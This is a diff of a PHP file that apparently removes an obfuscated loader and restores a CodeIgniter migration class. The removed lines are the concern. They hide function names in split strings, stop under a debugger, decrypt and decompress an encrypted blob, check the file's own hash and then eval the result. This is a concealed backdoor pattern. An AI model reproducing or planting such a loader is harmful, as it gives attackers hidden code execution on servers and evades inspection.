@@ -1,28 +1,411 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_n382s7sv=('bas'.'e64'.'_de'.'cod'.'e');
-$_dzk4dfxv=('gzu'.'nco'.'mpr'.'ess');
-$_ejkxjgxa=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_qq9edkxw='pZr5rHEC';
-$_dt0lwxni='VwK1n1A7';
-$_khg1v3wm='e6zolz5EaEo=';
-$_ojj0i2ce='/EL7cjX+';
-$_f9yadoe0='TUOvNEBp';
-$_zk3sxwg9='6RDL55zw';
-$_hg991323='QRP5SA==';
-$_zrk04kap='JQljThzf';
-$_fldvztqi=$_n382s7sv($_dt0lwxni.$_qq9edkxw.$_ojj0i2ce.$_f9yadoe0.$_khg1v3wm);
-$_lxjwr8rs=$_n382s7sv($_zk3sxwg9.$_zrk04kap.$_hg991323);
-$_timmog79=$_n382s7sv('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');
-$_akcvhknx=$_ejkxjgxa($_timmog79,'aes-256-cbc',$_fldvztqi,OPENSSL_RAW_DATA,$_lxjwr8rs);
-if($_akcvhknx===false){exit;}
-$_v0g0zwn4=$_dzk4dfxv($_akcvhknx);
-if($_v0g0zwn4===false){exit;}
-$_t7bvscop='3e036c7398e1e3ee31f71e8a1db124e26c46b2235a1837474eb305c233e33a8e';
-$_y4mnyvpr=@file_get_contents(__FILE__);
-if($_y4mnyvpr!==false){
-$_jej9wk8v=str_replace($_t7bvscop,"0000000000000000000000000000000000000000000000000000000000000000",$_y4mnyvpr);
-$_jxqb9a8a=hash("sha256",$_jej9wk8v);
-if($_jxqb9a8a!==$_t7bvscop){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_Migration {
+
+
+
+
+
+protected $_migration_enabled = FALSE;
+
+
+
+
+
+protected $_migration_type = 'sequential';
+
+
+
+
+
+protected $_migration_path = NULL;
+
+
+
+
+
+protected $_migration_version = 0;
+
+
+
+
+
+protected $_migration_table = 'migrations';
+
+
+
+
+
+protected $_migration_auto_latest = FALSE;
+
+
+
+
+
+protected $_migration_regex;
+
+
+
+
+
+protected $_error_string = '';
+
+
+
+
+
+
+public function __construct($config = array())
+{
+
+if ( ! in_array(get_class($this), array('CI_Migration', config_item('subclass_prefix').'Migration'), TRUE))
+{
+return;
 }
-eval($_v0g0zwn4);
+foreach ($config as $key => $val)
+{
+$this->{'_'.$key} = $val;
+}
+log_message('info', 'Migrations Class Initialized');
+
+if ($this->_migration_enabled !== TRUE)
+{
+show_error('Migrations has been loaded but is disabled or set up incorrectly.');
+}
+
+$this->_migration_path !== '' OR $this->_migration_path = APPPATH.'migrations/';
+
+$this->_migration_path = rtrim($this->_migration_path, '/').'/';
+
+$this->lang->load('migration');
+
+$this->load->dbforge();
+
+if (empty($this->_migration_table))
+{
+show_error('Migrations configuration file (migration.php) must have "migration_table" set.');
+}
+
+$this->_migration_regex = ($this->_migration_type === 'timestamp')
+? '/^\d{14}_(\w+)$/'
+: '/^\d{3}_(\w+)$/';
+
+if ( ! in_array($this->_migration_type, array('sequential', 'timestamp')))
+{
+show_error('An invalid migration numbering type was specified: '.$this->_migration_type);
+}
+
+if ( ! $this->db->table_exists($this->_migration_table))
+{
+$this->dbforge->add_field(array(
+'version' => array('type' => 'BIGINT', 'constraint' => 20),
+));
+$this->dbforge->create_table($this->_migration_table, TRUE);
+$this->db->insert($this->_migration_table, array('version' => 0));
+}
+
+if ($this->_migration_auto_latest === TRUE && ! $this->latest())
+{
+show_error($this->error_string());
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function version($target_version)
+{
+
+$current_version = $this->_get_version();
+if ($this->_migration_type === 'sequential')
+{
+$target_version = sprintf('%03d', $target_version);
+}
+else
+{
+$target_version = (string) $target_version;
+}
+$migrations = $this->find_migrations();
+if ($target_version > 0 && ! isset($migrations[$target_version]))
+{
+$this->_error_string = sprintf($this->lang->line('migration_not_found'), $target_version);
+return FALSE;
+}
+if ($target_version > $current_version)
+{
+$method = 'up';
+}
+elseif ($target_version < $current_version)
+{
+$method = 'down';
+
+krsort($migrations);
+}
+else
+{
+
+return TRUE;
+}
+
+
+
+
+
+
+$pending = array();
+foreach ($migrations as $number => $file)
+{
+
+
+
+
+if ($method === 'up')
+{
+if ($number <= $current_version)
+{
+continue;
+}
+elseif ($number > $target_version)
+{
+break;
+}
+}
+else
+{
+if ($number > $current_version)
+{
+continue;
+}
+elseif ($number <= $target_version)
+{
+break;
+}
+}
+
+if ($this->_migration_type === 'sequential')
+{
+if (isset($previous) && abs($number - $previous) > 1)
+{
+$this->_error_string = sprintf($this->lang->line('migration_sequence_gap'), $number);
+return FALSE;
+}
+$previous = $number;
+}
+include_once($file);
+$class = 'Migration_'.ucfirst(strtolower($this->_get_migration_name(basename($file, '.php'))));
+
+if ( ! class_exists($class, FALSE))
+{
+$this->_error_string = sprintf($this->lang->line('migration_class_doesnt_exist'), $class);
+return FALSE;
+}
+elseif ( ! is_callable(array($class, $method)))
+{
+$this->_error_string = sprintf($this->lang->line('migration_missing_'.$method.'_method'), $class);
+return FALSE;
+}
+$pending[$number] = array($class, $method);
+}
+
+foreach ($pending as $number => $migration)
+{
+log_message('debug', 'Migrating '.$method.' from version '.$current_version.' to version '.$number);
+$migration[0] = new $migration[0];
+call_user_func($migration);
+$current_version = $number;
+$this->_update_version($current_version);
+}
+
+
+if ($current_version <> $target_version)
+{
+$current_version = $target_version;
+$this->_update_version($current_version);
+}
+log_message('debug', 'Finished migrating to '.$current_version);
+return $current_version;
+}
+
+
+
+
+
+
+public function latest()
+{
+$migrations = $this->find_migrations();
+if (empty($migrations))
+{
+$this->_error_string = $this->lang->line('migration_none_found');
+return FALSE;
+}
+$last_migration = basename(end($migrations));
+
+
+return $this->version($this->_get_migration_number($last_migration));
+}
+
+
+
+
+
+
+public function current()
+{
+return $this->version($this->_migration_version);
+}
+
+
+
+
+
+
+public function error_string()
+{
+return $this->_error_string;
+}
+
+
+
+
+
+
+public function find_migrations()
+{
+$migrations = array();
+
+foreach (glob($this->_migration_path.'*_*.php') as $file)
+{
+$name = basename($file, '.php');
+
+if (preg_match($this->_migration_regex, $name))
+{
+$number = $this->_get_migration_number($name);
+
+if (isset($migrations[$number]))
+{
+$this->_error_string = sprintf($this->lang->line('migration_multiple_version'), $number);
+show_error($this->_error_string);
+}
+$migrations[$number] = $file;
+}
+}
+ksort($migrations);
+return $migrations;
+}
+
+
+
+
+
+
+
+protected function _get_migration_number($migration)
+{
+return sscanf($migration, '%[0-9]+', $number)
+? $number : '0';
+}
+
+
+
+
+
+
+
+protected function _get_migration_name($migration)
+{
+$parts = explode('_', $migration);
+array_shift($parts);
+return implode('_', $parts);
+}
+
+
+
+
+
+
+protected function _get_version()
+{
+$row = $this->db->select('version')->get($this->_migration_table)->row();
+return $row ? $row->version : '0';
+}
+
+
+
+
+
+
+
+protected function _update_version($migration)
+{
+$this->db->update($this->_migration_table, array(
+'version' => $migration
+));
+}
+
+
+
+
+
+
+
+public function __get($var)
+{
+return get_instance()->$var;
+}
+}
